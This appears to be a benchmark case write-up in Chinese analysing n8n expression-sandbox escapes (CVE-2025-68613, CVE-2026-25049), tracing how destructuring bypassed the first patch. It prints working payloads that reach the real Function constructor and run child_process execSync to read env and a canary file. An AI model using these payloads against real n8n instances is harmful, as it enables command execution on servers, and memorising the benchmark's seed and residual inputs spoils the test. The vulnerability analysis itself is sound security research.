# n8n：FunctionThisSanitizer 绑死了 `this`，解构赋值仍能取出 constructor

- Case：`PCBV2-0201`
- 产品：n8n 工作流表达式（npm `n8n-workflow`，源在 `n8n-io/n8n` 的 `packages/workflow`）。运行时是整包 `npm i n8n-workflow@1.119.0` + `harness.js`：`POST / {"expr":…}` → 真实的 `evaluateExpression`（Tournament + `FunctionThisSanitizer` / `PrototypeSanitizer`）。不是抽出来的函数。
- 链：CVE-2025-68613（n8n-workflow 1.116.0 → 1.119.0 / n8n 1.122.0，GHSA-v98v-ff95-f3cp）→ CVE-2026-25049（1.119.0 → 1.120.7 / n8n 1.123.17，GHSA-6cqr-8cfr-67f8）。后一条 advisory 原话：*Additional exploits in the expression evaluation of n8n have been identified and patched following CVE-2025-68613.*
- 源码对着 tag `n8n@1.122.0` 的 `packages/workflow/src/expression-sandboxing.ts`。金丝雀在 `process.env.PCB_FLAG` 和 `/canary/flag.txt`，不在 sandbox `data` 上。

根因不只是「漏了一种语法」。检查插在「普通 `function` 的 `this` 要不要改写成 `{process:{}}`」以及「`MemberExpression` 的属性在不在 blocklist」上；真正拿到 `Function` 的还可以是 `ObjectPattern` 解构，它根本不生成 `MemberExpression`。同一次 `PrototypeSanitizer` 已经有 `isSafeObjectProperty`，V1 却没有 `visitObjectPattern`。下面按调用走进去。

---

## 这块功能本来在干什么

n8n 在节点参数里求 `{{ ... }}`。表达式经 `@n8n/tournament` 做 AST hook，再编译成 `Function`，对一份策过的 `data` 跑。`Expression.initializeGlobalContext(data)` 把 `Function` / `globalThis` 等影子化，`process` 不在 data 上。本 case harness 调的就是这条官方求值函数：

```js
// harness.js
const proxy = require('.../expression-evaluator-proxy.js');
const data = {};
Expression.initializeGlobalContext(data);
data[sandbox.sanitizerName] = sandbox.sanitizer;
return proxy.evaluateExpression(expr, data);
```

```http
POST /
{"expr":"{{ 1+1 }}"}
```

设计意图：表达式只能读 data 上的业务字段，`this` 不能是 Node 全局，`constructor` / `__proto__` / `prototype` 不能读。成功穿越之后的效果是：**逃到真实 `process` 或真实 `Function`，读出 env / `cat /canary/flag.txt`，响应里出现 `PCBFLAG_...`**。

数据流：

```text
POST / {"expr":"{{ (function(){ return this.process.env.PCB_FLAG })() }}"}
    → evaluateExpression
         Tournament before: FunctionThisSanitizer   ← V1 只加了这个
         Tournament after:  PrototypeSanitizer.visitMemberExpression
                            DollarSignValidator
         new Function(...)(data)
    → output 里 PCBFLAG_...
```

这是库 API（产品里要登录才能改工作流；harness 直接求值）。良性表达式看不见 env。

---

## 原始漏洞：普通函数的 `this` 就是 Node 全局（CVE-2025-68613，1.116.0）

非严格模式里，`(function(){ ... })()` 的 `this` 是 global。sandbox 影子化了 data 上的 `process`，但 `this.process` 是真的。Vulhub / 公开分析里的经典式：

```text
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id') })() }}
```

本 case seed 只读 env 金丝雀：

```text
{{ (function(){ return this.process.env.PCB_FLAG })() }}
```

1.116.0 没有 `FunctionThisSanitizer`。`PrototypeSanitizer` 只 `visitMemberExpression`，拦点号/字面量 `constructor`，不拦 `this`。求值结果是 `PCBFLAG_...`。这就是 v0 + `--seed` 观察到 flag。

NVD CVE-2025-68613：*expressions supplied by authenticated users … evaluated in an execution context that is not sufficiently isolated from the underlying runtime*。修复版本含 1.122.0（本 case V1 的 n8n 产品 tag）。

---

## 维护者改了什么（CVE-2025-68613 修复，1.119.0 / n8n 1.122.0）

V1 加了 `FunctionThisSanitizer`（AST **before** hook）。对着 tag `n8n@1.122.0`：

```ts
// packages/workflow/src/expression-sandboxing.ts  (n8n@1.122.0)
const EMPTY_CONTEXT = b.objectExpression([
  b.property('init', b.identifier('process'), b.objectExpression([])),
]);

export const FunctionThisSanitizer: ASTBeforeHook = (ast, dataNode) => {
  astVisit(ast, {
    visitCallExpression(path) {
      if (node.callee.type !== 'FunctionExpression') {
        this.traverse(path);
        return;
      }
      // (function(...){...})(args)
      //   → (function(...){...}).call({ process: {} }, args)
      const callExpression = b.callExpression(
        b.memberExpression(fnExpression, b.identifier('call')),
        [EMPTY_CONTEXT, ...node.arguments],
      );
      path.replace(callExpression);
    },
    visitFunctionExpression(path) {
      // 回调：fn.bind({ process: {} })
      const boundFunction = b.callExpression(
        b.memberExpression(node, b.identifier('bind')),
        [EMPTY_CONTEXT],
      );
      path.replace(boundFunction);
    },
  });
};
```

`PrototypeSanitizer` **未改**：只有 `visitMemberExpression`。静态 `constructor` 仍抛 `Cannot access "constructor"`；计算键包一层 `data.__sanitize(prop)`。

V1 谓词的字面意思：

| hook | 1.119.0 |
|---|---|
| `FunctionThisSanitizer` | 被调用/当回调的 `FunctionExpression` 的 `this` → `{process:{}}` |
| `PrototypeSanitizer.visitMemberExpression` | 属性名 ∈ {constructor, __proto__, prototype, …} → 抛错 |
| `visitObjectPattern` | **没有** |

对 seed：IIFE 变成 `.call({process:{}}, …)`，`this.process` 是空对象，`.env` 是 `undefined`。输出不是 flag。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险的全局逃逸只通过普通函数的 `this`。
2. 危险的 `constructor` 只通过成员表达式出现。

第二点不成立。`const {constructor: F} = Array` 是 `ObjectPattern`，没有 `MemberExpression` 节点，`visitMemberExpression` 整段不进。

---

## 消毒之后，值怎么接到 Function 上

`FunctionThisSanitizer` 改写完 `this` 之后，表达式仍编译成 `Function` 对 `data` 求值。`PrototypeSanitizer` 只包成员访问。解构在 JS 里是「按键从对象取出属性」的另一套语法，AST 是 `ObjectPattern` + `Property`，不是 `obj.constructor`。

```text
const {[`constructor`]: a} = Array;
// 等价于 a = Array['constructor']，但没有 MemberExpression
const {[`constructor`]: F} = a;
// F === Function
F("return process.env.PCB_FLAG")()
```

过滤器刚看过的是「`this` 绑定」和「成员表达式的属性名」；消费者看到的是「解构出来的真实 `Function` 构造器」。两套取属性中间没有第二次 `isSafeObjectProperty`。

`F("return process.mainModule.require('child_process').execSync('cat /canary/flag.txt')")` 读的是入口种下的文件。金丝雀能出现在 `output` 里，依据就是这次 `Function` 调用，而不是「data 上碰巧有个同名字段」。

---

## 仓库里已经有更强的检查，解构没用

同一文件里的 `isSafeObjectProperty` / `sanitizer` 已经能在运行期拒绝 `constructor`。`visitMemberExpression` 对计算键会改写成 `data.__sanitize(prop)`。谁调用它：

| AST 节点 | 1.119.0 |
|---|---|
| `MemberExpression` 静态名 | `isSafeObjectProperty`，失败抛错 |
| `MemberExpression` 计算键 | 包 `__sanitize` |
| `ObjectPattern` 静态/计算键 | **不访问** |
| `this` / `globalThis`（箭头函数词法） | V1 **不改写**（V2 `ThisSanitizer` 才改） |

V1 等于在「成员访问」这条 AST 形态上挂了 blocklist，更强的「任何取出 constructor 的语法都拒绝」已经写在 `isSafeObjectProperty` 里，却没接到解构。不是没有更好的谓词，是 **visitObjectPattern 没写**。

V2 几乎是把同一份检查抄到 `visitObjectPattern`：计算键直接 `ExpressionComputedDestructuringError`，静态不安全键 `ExpressionDestructuringError`。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 解构」落到具体代码：

- V1 `FunctionThisSanitizer`：IIFE 的 `this.process` 变成 `{}`
- V1 `visitMemberExpression`：`.constructor` / `['constructor']` 抛错
- 解构：`const {constructor: F} = Array` 没有成员节点

只要用对象解构（字面量键或 TemplateLiteral 计算键）取出 `constructor`，前两行不会拦，第三行仍然拿到 `Function`。

```text
seed:     {{ (function(){ return this.process.env.PCB_FLAG })() }}
          → .call({process:{}}) → 无 flag

residual: {{ (()=>{
              const {[`constructor`]: a} = Array;
              const {[`constructor`]: F} = a;
              return F("return process.env.PCB_FLAG")();
            })() }}
          → 无 MemberExpression 的 constructor
          → F === Function → 读到 env / 或 execSync cat /canary/flag.txt
```

TemplateLiteral 计算键是 V2 `visitObjectPattern` 里 `prop.computed` 直接抛错的那条分支；字面量 `{constructor: F}` 走 `isSafeObjectProperty` 失败分支。两条都是同一未挂接的访问者。

---

## 残余仍然走同一个 evaluateExpression（CVE-2026-25049）

没有换求值 API、没有换 Tournament、没有换 data 上下文。还是：

```http
POST /  {"expr":"{{ (()=>{const {[`constructor`]:a}=Array; … F(...)()})() }}"}
```

`evaluateExpression` 仍然先跑 `FunctionThisSanitizer`（这条残余用箭头 IIFE，本来就没有自己的 `this`），再跑 `PrototypeSanitizer`（看不见 ObjectPattern）。`Function` 跑起来，`output` 里出现 flag。

GHSA-6cqr-8cfr-67f8：*Additional exploits in the expression evaluation of n8n have been identified and patched following CVE-2025-68613.* NVD：*abuse crafted expressions in workflow parameters to trigger unintended system command execution*，修复 1.123.17 / 2.5.2。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：`this` 重绑定不管解构；成员 blocklist 不访问 `ObjectPattern`；`isSafeObjectProperty` 已经存在却没挂上。seed 被挡住只说明「普通函数的 `this===global` 没了」，不说明「不能再从表达式摸到 Function」。

公开 residual 有的走 `execSync('cat /canary/flag.txt')`，有的只读 `process.env.PCB_FLAG`。效果通道仍是「沙箱逃逸后读种植金丝雀」，不是换了一个无关 sink。

---

## 后来又补了什么（CVE-2026-25049，1.120.7 / n8n 1.123.17）

tag `n8n@1.123.17` 里 `FunctionThisSanitizer` 改名为 `ThisSanitizer`，并改写 `this` / `globalThis`；`PrototypeSanitizer` 增加 `visitObjectPattern`：

```ts
// n8n@1.123.17 PrototypeSanitizer
visitObjectPattern(path) {
  this.traverse(path);
  for (const prop of node.properties) {
    if (prop.type === 'Property') {
      if (prop.computed) {
        throw new ExpressionComputedDestructuringError();
      }
      let keyName: string | undefined;
      if (prop.key.type === 'Identifier') keyName = prop.key.name;
      else if (prop.key.type === 'StringLiteral' || prop.key.type === 'Literal')
        keyName = String(prop.key.value);
      if (keyName !== undefined && !isSafeObjectProperty(keyName)) {
        throw new ExpressionDestructuringError(keyName);
      }
    }
  }
},
```

对残余输入：`{[`constructor`]: a}` 是 computed，直接 `ExpressionComputedDestructuringError`；即便改成 `{constructor: a}`，也会 `ExpressionDestructuringError("constructor")`。公开建议是升级到 n8n 1.123.17 / 2.5.2。

即便如此，这仍然是「再挂一种 AST 访问者」，不是换执行后端。对解构这条已知链它够用；若还有其它不经过 MemberExpression / ObjectPattern 的取属性写法，需要另证。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是函数 `this` 的绑定。真正拿到 `Function` 的是「按名字从对象取属性」。V1 只堵了成员表达式这一种语法。V2 仍在 AST hook 层加码，终于覆盖解构。

**不是没有更好的谓词。**  
`isSafeObjectProperty` 已经用在 `visitMemberExpression` 和运行期 `__sanitize` 上。解构没用。从 1.119.0 的 diff 只能看到 `FunctionThisSanitizer`；要判断补丁是否闭合，必须看到 `PrototypeSanitizer` 访问了哪些节点类型。

**同一 `evaluateExpression`，只换了取 constructor 的语法。**  
任何把用户 `{{ }}` 交给 Tournament 的工作流，在 n8n-workflow 1.119.0 上都吃「成员拦、解构不拦」这道缝。advisory 已写明 create/modify workflows。

**影子全局挡不住真实构造器。**  
`data.Function = {}` 挡的是标识符 `Function`。解构从 `Array` 取出的是真实构造器。金丝雀不在 data 上：能读到它，说明逃到了 Node 运行时，不是「表达式碰巧算出了这段字」。

---

## 版本、入口、参考

| | n8n-workflow / n8n tag | `this` hook | `PrototypeSanitizer` | 普通函数 `this.process` seed | 解构 `constructor` residual |
|---|---|---|---|---|---|
| V0 | 1.116.0 / n8n@1.119.1 | 无 | 仅 `visitMemberExpression` | 读到 env | （也能） |
| V1 | 1.119.0 / n8n@1.122.0 | `FunctionThisSanitizer` → `{process:{}}` | **未改** | 挡 | 读到 env / canary 文件 |
| V2 | 1.120.7 / n8n@1.123.17 | `ThisSanitizer`（含 `this`/`globalThis`） | + `visitObjectPattern` | 挡 | 挡 |

- 库 API：`evaluateExpression(expr, data)`（`expression-evaluator-proxy` + `Expression.initializeGlobalContext`）
- HTTP 面：`POST / {"expr":…}`（harness）
- 认证语义：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到。
- [CVE-2025-68613](https://nvd.nist.gov/vuln/detail/CVE-2025-68613)、[GHSA-v98v-ff95-f3cp](https://github.com/advisories/GHSA-v98v-ff95-f3cp)
- [CVE-2026-25049](https://nvd.nist.gov/vuln/detail/CVE-2026-25049)、[GHSA-6cqr-8cfr-67f8](https://github.com/n8n-io/n8n/security/advisories/GHSA-6cqr-8cfr-67f8)
- V1 blob：[`expression-sandboxing.ts` @ n8n@1.122.0](https://github.com/n8n-io/n8n/blob/n8n%401.122.0/packages/workflow/src/expression-sandboxing.ts)
- V2 blob：[`expression-sandboxing.ts` @ n8n@1.123.17](https://github.com/n8n-io/n8n/blob/n8n%401.123.17/packages/workflow/src/expression-sandboxing.ts)
